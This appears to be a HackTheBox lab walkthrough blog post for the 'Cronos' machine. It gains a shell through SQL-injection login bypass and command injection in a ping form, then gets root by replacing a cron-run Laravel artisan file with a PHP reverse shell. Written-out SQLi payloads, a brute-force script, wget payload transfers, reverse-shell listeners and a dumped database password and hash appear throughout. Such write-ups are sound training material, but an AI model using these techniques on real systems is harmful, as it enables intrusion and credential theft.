---
layout: page
title: Cronos
description: Cronos from HackTheBox.
img: 
importance: 3
category: HackTheBox
related_publications: false
---

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="assets/img/cronos/logo.png" title="HTB Cronos Logo" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
<h2>Link</h2>
<a href="https://app.hackthebox.com/machines/Cronos">Room Link</a>

<br/>
<h2>Process</h2>

<br/>
Cronos is the box on deck this time!

Run nmap and get a list of the ports.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/cronos]
└─$ sudo nmap -sC -sV -A -O -oN nmap 10.10.10.13 
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-15 21:38 AEDT
Nmap scan report for cronos.htb (10.10.10.13)
Host is up (0.0099s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA)
|   256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA)
|_  256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519)
53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Cronos
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.14, Linux 3.8 - 3.16
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 256/tcp)
HOP RTT      ADDRESS
1   56.65 ms 10.10.16.1
2   7.68 ms  cronos.htb (10.10.10.13)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.45 seconds
```
{% endraw %}

<br />
Run nmap against all the ports to find any non-standard services.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/cronos]
└─$ sudo nmap -sS -p- -oN nmapfull 10.10.10.13 
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-15 21:38 AEDT
Nmap scan report for cronos.htb (10.10.10.13)
Host is up (0.014s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
53/tcp open  domain
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 9.09 seconds
```
{% endraw %}

<br />
Run curl to see if there is any interesting information in the headers.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/cronos]
└─$ curl -I http://10.10.10.13
HTTP/1.1 200 OK
Date: Sat, 15 Feb 2025 10:41:49 GMT
Server: Apache/2.4.18 (Ubuntu)
Last-Modified: Fri, 01 Jan 2021 00:29:56 GMT
ETag: "2caf-5b7cbd6fbb19d"
Accept-Ranges: bytes
Content-Length: 11439
Vary: Accept-Encoding
Content-Type: text/html
```
{% endraw %}

<br />
Try adding cronos.htb to the /etc/hosts file.  Cronos is the name of the box and name.htb is a common convention.  Good enough to give it a try.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/cronos]
└─$ cat /etc/hosts              
127.0.0.1       localhost
127.0.1.1       kali
10.10.10.13     cronos.htb


# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```
{% endraw %}

<br />
Check the landing page that is being served on port 80.  Cronos.htb seems to get a different result than the Apache page.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/cronos/landing.png" title="Port 80 Landing Page" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Check the source code for the port 80 landing page.

{% raw %}
```html
view-source:http://cronos.htb/

<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1">

        <title>Cronos</title>

        <!-- Fonts -->
        <link href="https://fonts.googleapis.com/css?family=Raleway:100,600" rel="stylesheet" type="text/css">

        <!-- Styles -->
        <style>
  
  <snip>

        </style>
    </head>
    <body>
        <div class="flex-center position-ref full-height">
            
            <div class="content">
                <div class="title m-b-md">
                    Cronos
                </div>

                <div class="links">
                    <a href="https://laravel.com/docs">Documentation</a>
                    <a href="https://laracasts.com">Laracasts</a>
                    <a href="https://laravel-news.com">News</a>
                    <a href="https://forge.laravel.com">Forge</a>
                    <a href="https://github.com/laravel/laravel">GitHub</a>
                </div>
            </div>
        </div>
    </body>
</html>
```
{% endraw %}

<br />
Check the robots.txt file for any potential juicy information.

{% raw %}
```html
http://cronos.htb/robots.txt

User-agent: *
Disallow:
```
{% endraw %}

<br />
Ffuf port 80 to try and find any directories or files that might be interesting to review.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/cronos]
└─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://cronos.htb/FUZZ -e .txt,.bak,.html,.php -fw 990

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://cronos.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Extensions       : .txt .bak .html .php 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 990
________________________________________________

.php                    [Status: 403, Size: 289, Words: 22, Lines: 12, Duration: 12ms]
.html                   [Status: 403, Size: 290, Words: 22, Lines: 12, Duration: 15ms]
css                     [Status: 301, Size: 306, Words: 20, Lines: 10, Duration: 12ms]
js                      [Status: 301, Size: 305, Words: 20, Lines: 10, Duration: 11ms]
robots.txt              [Status: 200, Size: 24, Words: 2, Lines: 3, Duration: 12ms]
.html                   [Status: 403, Size: 290, Words: 22, Lines: 12, Duration: 16ms]
.php                    [Status: 403, Size: 289, Words: 22, Lines: 12, Duration: 16ms]
server-status           [Status: 403, Size: 298, Words: 22, Lines: 12, Duration: 19ms]
:: Progress: [1102795/1102795] :: Job [1/1] :: 1960 req/sec :: Duration: [0:08:56] :: Errors: 0 ::
```
{% endraw %}

<br />
Ffuf for subdomains.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/cronos]
└─$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://cronos.htb -H "Host: FUZZ.cronos.htb" -fw 3534

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://cronos.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.cronos.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 3534
________________________________________________

www                     [Status: 200, Size: 2319, Words: 990, Lines: 86, Duration: 37ms]
admin                   [Status: 200, Size: 1547, Words: 525, Lines: 57, Duration: 2919ms]
:: Progress: [114441/114441] :: Job [1/1] :: 847 req/sec :: Duration: [0:02:25] :: Errors: 0 ::
```
{% endraw %}

<br />
Add the new subdomain findings to the /etc/hosts file.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/cronos]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.10.10.13     cronos.htb www.cronos.htb admin.cronos.htb


# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```
{% endraw %}

<br />
Check the admin.cronos.htb page to see what it is.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/cronos/adminlanding.png" title="Admin Landing" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Check the source code for the admin page.  Maybe we can get lucky with a comment.

{% raw %}
```bash
<html>
   
   <head>
      <title>Login Page</title>
      
      <style type = "text/css">
         body {
            font-family:Arial, Helvetica, sans-serif;
            font-size:14px;
         }
         
         label {
            font-weight:bold;
            width:100px;
            font-size:14px;
         }
         
         .box {
            border:#666666 solid 1px;
         }
      </style>
      
   </head>
   
   <body bgcolor = "#FFFFFF">
	
      <div align = "center">
         <div style = "width:300px; border: solid 1px #333333; " align = "left">
            <div style = "background-color:#333333; color:#FFFFFF; padding:3px;"><b>Login</b></div>
				
            <div style = "margin:30px">
               
               <form action = "" method = "post">
                  <label>UserName  :</label><input type = "text" name = "username" class = "box"/><br /><br />
                  <label>Password  :</label><input type = "password" name = "password" class = "box" /><br/><br />
                  <input type = "submit" value = " Submit "/><br />
               </form>
               
               <div style = "font-size:11px; color:#cc0000; margin-top:10px"></div>
					
            </div>
				
         </div>
			
      </div>
<br><br><br><br>
<div align = "center">
         <div style = "width:400px; border: solid 1px #333333; " align = "left">
            <div style = "background-color:#333333; color:#FFFFFF; padding:3px;"><b>Advertisement</b></div>


         </div>

      </div>
   </body>
</html>
```
{% endraw %}

<br />
Try logging in to see what happens.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/cronos/failed.png" title="Failed Login" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Get the POST request from the dev tools.  If you didn't have them open, open the dev tools and try logging in...again.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/cronos/devtools.png" title="Login Request" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

{% raw %}
```bash
POST / HTTP/1.1
Host: admin.cronos.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 29
Origin: http://admin.cronos.htb
Connection: keep-alive
Referer: http://admin.cronos.htb/
Cookie: PHPSESSID=o7dl4ttt5e5qsa22erunlfbij0
Upgrade-Insecure-Requests: 1
Priority: u=0, i

username=admin&password=admin
```
{% endraw %}

<br />
Ffuf the new admin subdomain.  Maybe we can find some kind of creds file.  Worth a shot.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/cronos]
└─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://admin.cronos.htb/FUZZ -e .txt,.bak,.html,.php -fw 525

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://admin.cronos.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Extensions       : .txt .bak .html .php 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 525
________________________________________________

.php                    [Status: 403, Size: 295, Words: 22, Lines: 12, Duration: 9ms]
.html                   [Status: 403, Size: 296, Words: 22, Lines: 12, Duration: 11ms]
welcome.php             [Status: 302, Size: 439, Words: 55, Lines: 21, Duration: 12ms]
logout.php              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 20ms]
config.php              [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 13ms]
session.php             [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 21ms]
.html                   [Status: 403, Size: 296, Words: 22, Lines: 12, Duration: 11ms]
.php                    [Status: 403, Size: 295, Words: 22, Lines: 12, Duration: 13ms]
server-status           [Status: 403, Size: 304, Words: 22, Lines: 12, Duration: 13ms]
:: Progress: [1102795/1102795] :: Job [1/1] :: 1739 req/sec :: Duration: [0:06:47] :: Errors: 0 ::
```
{% endraw %}

<br />
Create a payloads list the concatenate the two authentication bypass lists from PayloadAllTheThings.

{% raw %}
```bash
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/Intruder/Auth_Bypass2.txt
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/Intruder/Auth_Bypass.txt
```
{% endraw %}

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/cronos]
└─$ cat payloads.txt 
'-'
' '
'&'
'^'
'*'
' or ''-'
' or '' '
' or ''&'
' or ''^'

<snip>
```
{% endraw %}

<br />
Create a python the test the two fields with the payload list that was just created.

{% raw %}
```python
import requests

check = 'invalid'

url = 'http://admin.cronos.htb/'
headers = {}
cookies = {}
params = {}

with open('/home/kali/Documents/htb/cronos/payloads.txt','r') as fs:
    for line in fs:
        password = line.rstrip('\n')
        data = {'username':password,
                'password':'admin'}
        r = requests.post(url=url,headers=headers,cookies=cookies,params=params,data=data)
        if check not in r.text:
            print('username -> {payload}'.format(payload=password))

        data = {'username':'admin',
                'password':password}
        r = requests.post(url=url,headers=headers,cookies=cookies,params=params,data=data)
        if check not in r.text:
            print('password -> {payload}'.format(payload=password))

        
print('Fin')
```
{% endraw %}

<br />
Run the script to see valid payloads.

{% raw %}
```python
========== RESTART: /home/kali/Documents/htb/cronos/htb-cronos_0x00.py =========
username -> admin' #
username -> admin' or '1'='1
username -> admin' or '1'='1'#
username -> admin'or 1=1 or ''='
username -> admin' or 1=1#
username -> 1' or 1.e(1) or '1'='1

<snip>
```
{% endraw %}

<br />
Test the first payload, admin' #.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/cronos/welcome.png" title="Welcome PHP" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Test the Traceroute functionality.  View the request.

{% raw %}
```bash
POST /welcome.php HTTP/1.1
Host: admin.cronos.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Origin: http://admin.cronos.htb
Connection: keep-alive
Referer: http://admin.cronos.htb/welcome.php
Cookie: PHPSESSID=o7dl4ttt5e5qsa22erunlfbij0
Upgrade-Insecure-Requests: 1
Priority: u=0, i

command=traceroute&host=10.10.16.12
```
{% endraw %}

<br />
Test the ping functionality to see what it does.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/cronos/ping.png" title="Ping" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

{% raw %}
```bash
POST /welcome.php HTTP/1.1
Host: admin.cronos.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 34
Origin: http://admin.cronos.htb
Connection: keep-alive
Referer: http://admin.cronos.htb/welcome.php
Cookie: PHPSESSID=o7dl4ttt5e5qsa22erunlfbij0
Upgrade-Insecure-Requests: 1
Priority: u=0, i

command=ping+-c+1&host=10.10.16.12
```
{% endraw %}

<br />
Try using ; to try and inject a second command.  We will use id as an introductory test.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/cronos/idping.png" title="ID Ping" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Start a listener.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/cronos]
└─$ nc -nlvp 4444     
listening on [any] 4444 ...
```
{% endraw %}

<br />
Use revshells to get a python one-liner.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/cronos/revshells.png" title="Revshells" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
<a href="https://www.revshells.com/">https://www.revshells.com/</a>

<br />
Inject the payload into the vulnerable ping command.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/cronos/inject.png" title="Inject" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Check the listener and catch the shell.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/cronos]
└─$ nc -nlvp 4444     
listening on [any] 4444 ...
connect to [10.10.16.12] from (UNKNOWN) [10.10.10.13] 59340
$ python -c 'import pty; pty.spawn("/bin/bash");'
python -c 'import pty; pty.spawn("/bin/bash");'
www-data@cronos:/var/www/admin$
```
{% endraw %}

<br />
Check the config.php file.  There are usually the database credentials in there.

{% raw %}
```php
<?php
   define('DB_SERVER', 'localhost');
   define('DB_USERNAME', 'admin');
   define('DB_PASSWORD', 'kEjdbRigfBHUREiNSDs');
   define('DB_DATABASE', 'admin');
   $db = mysqli_connect(DB_SERVER,DB_USERNAME,DB_PASSWORD,DB_DATABASE);
?>
```
{% endraw %}

<br />
Get the /etc/passwd file to check out the system user.

{% raw %}
```bash
www-data@cronos:/var/www/admin$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash

<snip>

dnsmasq:x:110:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:111:65534::/var/run/sshd:/usr/sbin/nologin
noulis:x:1000:1000:Noulis Panoulis,,,:/home/noulis:/bin/bash
bind:x:112:119::/var/cache/bind:/bin/false
```
{% endraw %}

<br />
Login into mysql using the credentials from the conf.php.

{% raw %}
```bash
mysql -u admin -p
Enter password: kEjdbRigfBHUREiNSDs

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 353
Server version: 5.7.17-0ubuntu0.16.04.2 (Ubuntu)

Copyright (c) 2000, 2016, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>
```
{% endraw %}

<br />
Look into the available databases and change into the admin database.

{% raw %}
```bash
mysql> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| admin              |
+--------------------+
2 rows in set (0.00 sec)

mysql> use admin;
use admin;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
```
{% endraw %}

<br />
Show the tables available in the admin database.

{% raw %}
```bash
mysql> show tables;
show tables;
+-----------------+
| Tables_in_admin |
+-----------------+
| users           |
+-----------------+
1 row in set (0.00 sec)
```
{% endraw %}

<br />
Dump the table.

{% raw %}
```bash
mysql> select * from users;
select * from users;
+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
|  1 | admin    | 4f5fffa7b2340178a716e3832451e058 |
+----+----------+----------------------------------+
1 row in set (0.00 sec)
```
{% endraw %}

<br />
Run that hash through hash-identifier to identify the type of hash.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/cronos]
└─$ hash-identifier                                      
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: 4f5fffa7b2340178a716e3832451e058

Possible Hashs:
[+] MD5
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))

<snip>
```
{% endraw %}

<br />
Use john the ripper to try and crack the password.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/cronos]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5 hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:01 DONE (2025-02-15 23:44) 0g/s 14062Kp/s 14062Kc/s 14062KC/s  fuckyooh21..*7¡Vamos!
Session completed.
```
{% endraw %}

<br />
Download linpeas.sh to the local working folder.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/cronos]
└─$ wget https://github.com/peass-ng/PEASS-ng/releases/download/20250202-a3a1123d/linpeas.sh
--2025-02-16 00:01:37--  https://github.com/peass-ng/PEASS-ng/releases/download/20250202-a3a1123d/linpeas.sh
Resolving github.com (github.com)... 4.237.22.38
Connecting to github.com (github.com)|4.237.22.38|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://objects.githubusercontent.com/github-production-release-asset-2e65be/165548191/d73618c9-7a15-48f8-8489-affff6078781?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=releaseassetproduction%2F20250215%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20250215T130138Z&X-Amz-Expires=300&X-Amz-Signature=d5755bf2afab41f2257947659cb9fe5c66486b549889191e41d9ccb6035e89b5&X-Amz-SignedHeaders=host&response-content-disposition=attachment%3B%20filename%3Dlinpeas.sh&response-content-type=application%2Foctet-stream [following]
--2025-02-16 00:01:37--  https://objects.githubusercontent.com/github-production-release-asset-2e65be/165548191/d73618c9-7a15-48f8-8489-affff6078781?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=releaseassetproduction%2F20250215%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20250215T130138Z&X-Amz-Expires=300&X-Amz-Signature=d5755bf2afab41f2257947659cb9fe5c66486b549889191e41d9ccb6035e89b5&X-Amz-SignedHeaders=host&response-content-disposition=attachment%3B%20filename%3Dlinpeas.sh&response-content-type=application%2Foctet-stream
Resolving objects.githubusercontent.com (objects.githubusercontent.com)... 185.199.111.133, 185.199.108.133, 185.199.109.133, ...
Connecting to objects.githubusercontent.com (objects.githubusercontent.com)|185.199.111.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 839912 (820K) [application/octet-stream]
Saving to: ‘linpeas.sh’

linpeas.sh                                                 100%[========================================================================================================================================>] 820.23K  3.05MB/s    in 0.3s    

2025-02-16 00:01:38 (3.05 MB/s) - ‘linpeas.sh’ saved [839912/839912]

                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/htb/cronos]
└─$ python3 -m http.server          
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
{% endraw %}

<br />
Transfer the peas to the victim machine.

{% raw %}
```bash
www-data@cronos:/dev/shm$ wget 10.10.16.12:8000/linpeas.sh
wget 10.10.16.12:8000/linpeas.sh
--2025-02-15 15:07:45--  http://10.10.16.12:8000/linpeas.sh
Connecting to 10.10.16.12:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 839912 (820K) [text/x-sh]
Saving to: 'linpeas.sh'

linpeas.sh          100%[===================>] 820.23K  1.12MB/s    in 0.7s    

2025-02-15 15:07:46 (1.12 MB/s) - 'linpeas.sh' saved [839912/839912]

www-data@cronos:/dev/shm$ chmod +x linpeas.sh
chmod +x linpeas.sh
```
{% endraw %}

<br />
Run the mighty peas script and notice the file called /var/www/laravel/artisan file in the cron jobs section.

{% raw %}
```bash
www-data@cronos:/dev/shm$ ./linpeas.sh
./linpeas.sh

<snip>

17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* * * * *       root    php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1

<snip>
```
{% endraw %}

<br />
Check the permissions of this file.

{% raw %}
```bash
www-data@cronos:/var/www/laravel$ ls -la
ls -la
total 2012
drwxr-xr-x 13 www-data www-data    4096 May 10  2022 .
drwxr-xr-x  5 root     root        4096 May 10  2022 ..
-rw-r--r--  1 www-data www-data     572 Apr  9  2017 .env
drwxr-xr-x  8 www-data www-data    4096 May 10  2022 .git
-rw-r--r--  1 www-data www-data     111 Apr  9  2017 .gitattributes
-rw-r--r--  1 www-data www-data     117 Apr  9  2017 .gitignore
-rw-r--r--  1 www-data www-data     727 Apr  9  2017 CHANGELOG.md
drwxr-xr-x  6 www-data www-data    4096 May 10  2022 app
-rwxr-xr-x  1 www-data www-data    1646 Apr  9  2017 artisan

<snip>
```
{% endraw %}

<br />
Download the pentestmonkey php reverse shell file.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/cronos]
└─$  wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php -O artisan
--2025-02-16 00:28:45--  https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.110.133, 2606:50c0:8003::154, 2606:50c0:8001::154, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.110.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5491 (5.4K) [text/plain]
Saving to: ‘artisan’

artisan                                                    100%[========================================================================================================================================>]   5.36K  --.-KB/s    in 0s      

2025-02-16 00:28:46 (72.8 MB/s) - ‘artisan’ saved [5491/5491]

                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/htb/cronos]
└─$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
{% endraw %}

<br />
Update the lhost ip address to the ip address of the tun0 interface.

{% raw %}
```php
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.

<snip>

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.16.12';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

<snip>
```
{% endraw %}

<br />
Start a netcat listener.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/cronos]
└─$ nc -nlvp 1234 
listening on [any] 1234 ...
```
{% endraw %}

<br />
Transfer the new pentest monkey artisan file to the victim machine.

{% raw %}
```bash
www-data@cronos:/dev/shm$ wget 10.10.16.12:8000/artisan
wget 10.10.16.12:8000/artisan
--2025-02-15 15:32:55--  http://10.10.16.12:8000/artisan
Connecting to 10.10.16.12:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5493 (5.4K) [application/octet-stream]
Saving to: 'artisan'

artisan             100%[===================>]   5.36K  --.-KB/s    in 0.004s  

2025-02-15 15:32:55 (1.47 MB/s) - 'artisan' saved [5493/5493]

www-data@cronos:/dev/shm$ chmod +x artisan
chmod +x artisan
```
{% endraw %}

<br />
Overwrite the file in /var/www/laravel file with our malicious file.

{% raw %}
```bash
www-data@cronos:/dev/shm$ cp artisan /var/www/laravel/artisan
cp artisan /var/www/laravel/artisan
```
{% endraw %}

<br />
Give it some time for the cron job to execute.  Check the listener and catch the shell.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/cronos]
└─$ nc -nlvp 1234 
listening on [any] 1234 ...
connect to [10.10.16.12] from (UNKNOWN) [10.10.10.13] 44276
